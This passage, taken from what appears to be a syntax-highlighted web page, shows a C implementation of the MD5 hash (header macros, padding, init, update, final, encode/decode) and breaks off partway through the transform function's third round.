class="meta">#<span class="keyword">define</span> HH(a,b,c,d,x,s,ac) \</span></span><br><span class="line"><span class="meta">          &#123; \</span></span><br><span class="line"><span class="meta">          a += H(b,c,d) + x + ac; \</span></span><br><span class="line"><span class="meta">          a = ROTATE_LEFT(a,s); \</span></span><br><span class="line"><span class="meta">          a += b; \</span></span><br><span class="line"><span class="meta">          &#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> II(a,b,c,d,x,s,ac) \</span></span><br><span class="line"><span class="meta">          &#123; \</span></span><br><span class="line"><span class="meta">          a += I(b,c,d) + x + ac; \</span></span><br><span class="line"><span class="meta">          a = ROTATE_LEFT(a,s); \</span></span><br><span class="line"><span class="meta">          a += b; \</span></span><br><span class="line"><span class="meta">          &#125;                                            </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Init</span><span class="params">(MD5_CTX* context)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Update</span><span class="params">(MD5_CTX* context, <span class="type">unsigned</span> <span class="type">char</span>* input, <span class="type">unsigned</span> <span class="type">int</span> inputlen)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Final</span><span class="params">(MD5_CTX* context, <span class="type">unsigned</span> <span class="type">char</span> digest[<span class="number">16</span>])</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Transform</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> state[<span class="number">4</span>], <span class="type">unsigned</span> <span class="type">char</span> block[<span class="number">64</span>])</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Encode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* output, <span class="type">unsigned</span> <span class="type">int</span>* input, <span class="type">unsigned</span> <span class="type">int</span> len)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Decode</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* output, <span class="type">unsigned</span> <span class="type">char</span>* input, <span class="type">unsigned</span> <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;md5.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> PADDING[] = &#123; <span class="number">0x80</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"> <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"> <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"> <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Init</span><span class="params">(MD5_CTX* context)</span></span><br><span class="line">&#123;</span><br><span class="line">context-&gt;count[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">context-&gt;count[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">context-&gt;state[<span class="number">0</span>] = <span class="number">0x67452301</span>;</span><br><span class="line">context-&gt;state[<span class="number">1</span>] = <span class="number">0xEFCDAB89</span>;</span><br><span class="line">context-&gt;state[<span class="number">2</span>] = <span class="number">0x98BADCFE</span>;</span><br><span class="line">context-&gt;state[<span class="number">3</span>] = <span class="number">0x10325476</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Update</span><span class="params">(MD5_CTX* context, <span class="type">unsigned</span> <span class="type">char</span>* input, <span class="type">unsigned</span> <span class="type">int</span> inputlen)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>, index = <span class="number">0</span>, partlen = <span class="number">0</span>;</span><br><span class="line">index = (context-&gt;count[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x3F</span>;</span><br><span class="line">partlen = <span class="number">64</span> - index;</span><br><span class="line">context-&gt;count[<span class="number">0</span>] += inputlen &lt;&lt; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span> (context-&gt;count[<span class="number">0</span>] &lt; (inputlen &lt;&lt; <span class="number">3</span>))</span><br><span class="line">context-&gt;count[<span class="number">1</span>]++;</span><br><span class="line">context-&gt;count[<span class="number">1</span>] += inputlen &gt;&gt; <span class="number">29</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (inputlen &gt;= partlen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;context-&gt;buffer[index], input, partlen);</span><br><span class="line">MD5Transform(context-&gt;state, context-&gt;buffer);</span><br><span class="line"><span class="keyword">for</span> (i = partlen; i + <span class="number">64</span> &lt;= inputlen; i += <span class="number">64</span>)</span><br><span class="line">MD5Transform(context-&gt;state, &amp;input[i]);</span><br><span class="line">index = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;context-&gt;buffer[index], &amp;input[i], inputlen - i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Final</span><span class="params">(MD5_CTX* context, <span class="type">unsigned</span> <span class="type">char</span> digest[<span class="number">16</span>])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> index = <span class="number">0</span>, padlen = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> bits[<span class="number">8</span>];</span><br><span class="line">index = (context-&gt;count[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x3F</span>;</span><br><span class="line">padlen = (index &lt; <span class="number">56</span>) ? (<span class="number">56</span> - index) : (<span class="number">120</span> - index);</span><br><span class="line">MD5Encode(bits, context-&gt;count, <span class="number">8</span>);</span><br><span class="line">MD5Update(context, PADDING, padlen);</span><br><span class="line">MD5Update(context, bits, <span class="number">8</span>);</span><br><span class="line">MD5Encode(digest, context-&gt;state, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Encode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* output, <span class="type">unsigned</span> <span class="type">int</span>* input, <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (j &lt; len)</span><br><span class="line">&#123;</span><br><span class="line">output[j] = input[i] &amp; <span class="number">0xFF</span>;</span><br><span class="line">output[j + <span class="number">1</span>] = (input[i] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">output[j + <span class="number">2</span>] = (input[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">output[j + <span class="number">3</span>] = (input[i] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">i++;</span><br><span class="line">j += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Decode</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* output, <span class="type">unsigned</span> <span class="type">char</span>* input, <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (j &lt; len)</span><br><span class="line">&#123;</span><br><span class="line">output[i] = (input[j]) |</span><br><span class="line">(input[j + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">(input[j + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) |</span><br><span class="line">(input[j + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">i++;</span><br><span class="line">j += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Transform</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> state[<span class="number">4</span>], <span class="type">unsigned</span> <span class="type">char</span> block[<span class="number">64</span>])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> a = state[<span class="number">0</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> b = state[<span class="number">1</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> c = state[<span class="number">2</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> d = state[<span class="number">3</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> x[<span class="number">64</span>];</span><br><span class="line">MD5Decode(x, block, <span class="number">64</span>);</span><br><span class="line">FF(a, b, c, d, x[<span class="number">0</span>], <span class="number">7</span>, <span class="number">0xd76aa478</span>); <span class="comment">/* 1 */</span></span><br><span class="line">FF(d, a, b, c, x[<span class="number">1</span>], <span class="number">12</span>, <span class="number">0xe8c7b756</span>); <span class="comment">/* 2 */</span></span><br><span class="line">FF(c, d, a, b, x[<span class="number">2</span>], <span class="number">17</span>, <span class="number">0x242070db</span>); <span class="comment">/* 3 */</span></span><br><span class="line">FF(b, c, d, a, x[<span class="number">3</span>], <span class="number">22</span>, <span class="number">0xc1bdceee</span>); <span class="comment">/* 4 */</span></span><br><span class="line">FF(a, b, c, d, x[<span class="number">4</span>], <span class="number">7</span>, <span class="number">0xf57c0faf</span>); <span class="comment">/* 5 */</span></span><br><span class="line">FF(d, a, b, c, x[<span class="number">5</span>], <span class="number">12</span>, <span class="number">0x4787c62a</span>); <span class="comment">/* 6 */</span></span><br><span class="line">FF(c, d, a, b, x[<span class="number">6</span>], <span class="number">17</span>, <span class="number">0xa8304613</span>); <span class="comment">/* 7 */</span></span><br><span class="line">FF(b, c, d, a, x[<span class="number">7</span>], <span class="number">22</span>, <span class="number">0xfd469501</span>); <span class="comment">/* 8 */</span></span><br><span class="line">FF(a, b, c, d, x[<span class="number">8</span>], <span class="number">7</span>, <span class="number">0x698098d8</span>); <span class="comment">/* 9 */</span></span><br><span class="line">FF(d, a, b, c, x[<span class="number">9</span>], <span class="number">12</span>, <span class="number">0x8b44f7af</span>); <span class="comment">/* 10 */</span></span><br><span class="line">FF(c, d, a, b, x[<span class="number">10</span>], <span class="number">17</span>, <span class="number">0xffff5bb1</span>); <span class="comment">/* 11 */</span></span><br><span class="line">FF(b, c, d, a, x[<span class="number">11</span>], <span class="number">22</span>, <span class="number">0x895cd7be</span>); <span class="comment">/* 12 */</span></span><br><span class="line">FF(a, b, c, d, x[<span class="number">12</span>], <span class="number">7</span>, <span class="number">0x6b901122</span>); <span class="comment">/* 13 */</span></span><br><span class="line">FF(d, a, b, c, x[<span class="number">13</span>], <span class="number">12</span>, <span class="number">0xfd987193</span>); <span class="comment">/* 14 */</span></span><br><span class="line">FF(c, d, a, b, x[<span class="number">14</span>], <span class="number">17</span>, <span class="number">0xa679438e</span>); <span class="comment">/* 15 */</span></span><br><span class="line">FF(b, c, d, a, x[<span class="number">15</span>], <span class="number">22</span>, <span class="number">0x49b40821</span>); <span class="comment">/* 16 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Round 2 */</span></span><br><span class="line">GG(a, b, c, d, x[<span class="number">1</span>], <span class="number">5</span>, <span class="number">0xf61e2562</span>); <span class="comment">/* 17 */</span></span><br><span class="line">GG(d, a, b, c, x[<span class="number">6</span>], <span class="number">9</span>, <span class="number">0xc040b340</span>); <span class="comment">/* 18 */</span></span><br><span class="line">GG(c, d, a, b, x[<span class="number">11</span>], <span class="number">14</span>, <span class="number">0x265e5a51</span>); <span class="comment">/* 19 */</span></span><br><span class="line">GG(b, c, d, a, x[<span class="number">0</span>], <span class="number">20</span>, <span class="number">0xe9b6c7aa</span>); <span class="comment">/* 20 */</span></span><br><span class="line">GG(a, b, c, d, x[<span class="number">5</span>], <span class="number">5</span>, <span class="number">0xd62f105d</span>); <span class="comment">/* 21 */</span></span><br><span class="line">GG(d, a, b, c, x[<span class="number">10</span>], <span class="number">9</span>, <span class="number">0x2441453</span>); <span class="comment">/* 22 */</span></span><br><span class="line">GG(c, d, a, b, x[<span class="number">15</span>], <span class="number">14</span>, <span class="number">0xd8a1e681</span>); <span class="comment">/* 23 */</span></span><br><span class="line">GG(b, c, d, a, x[<span class="number">4</span>], <span class="number">20</span>, <span class="number">0xe7d3fbc8</span>); <span class="comment">/* 24 */</span></span><br><span class="line">GG(a, b, c, d, x[<span class="number">9</span>], <span class="number">5</span>, <span class="number">0x21e1cde6</span>); <span class="comment">/* 25 */</span></span><br><span class="line">GG(d, a, b, c, x[<span class="number">14</span>], <span class="number">9</span>, <span class="number">0xc33707d6</span>); <span class="comment">/* 26 */</span></span><br><span class="line">GG(c, d, a, b, x[<span class="number">3</span>], <span class="number">14</span>, <span class="number">0xf4d50d87</span>); <span class="comment">/* 27 */</span></span><br><span class="line">GG(b, c, d, a, x[<span class="number">8</span>], <span class="number">20</span>, <span class="number">0x455a14ed</span>); <span class="comment">/* 28 */</span></span><br><span class="line">GG(a, b, c, d, x[<span class="number">13</span>], <span class="number">5</span>, <span class="number">0xa9e3e905</span>); <span class="comment">/* 29 */</span></span><br><span class="line">GG(d, a, b, c, x[<span class="number">2</span>], <span class="number">9</span>, <span class="number">0xfcefa3f8</span>); <span class="comment">/* 30 */</span></span><br><span class="line">GG(c, d, a, b, x[<span class="number">7</span>], <span class="number">14</span>, <span class="number">0x676f02d9</span>); <span class="comment">/* 31 */</span></span><br><span class="line">GG(b, c, d, a, x[<span class="number">12</span>], <span class="number">20</span>, <span class="number">0x8d2a4c8a</span>); <span class="comment">/* 32 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Round 3 */</span></span><br><span class="line">HH(a, b, c, d, x[<span class="number">5</span>], <span class="number">4</span>, <span class="number">0xfffa3942</span>); <span class="comment">/* 33 */</span></span><br><span class="line">HH(d, a, b, c, x[<span class="number">8</span>], <span class="number">11</span>, <span class="number">0x8771f681</span>); <span class="comment">/* 34 */</span></span><br><span class="line">HH(c, d, a, b, x[<span class="number">11</span>], <span class="number">16</span>, <span class="number">0x6d9d6122</span>); <span 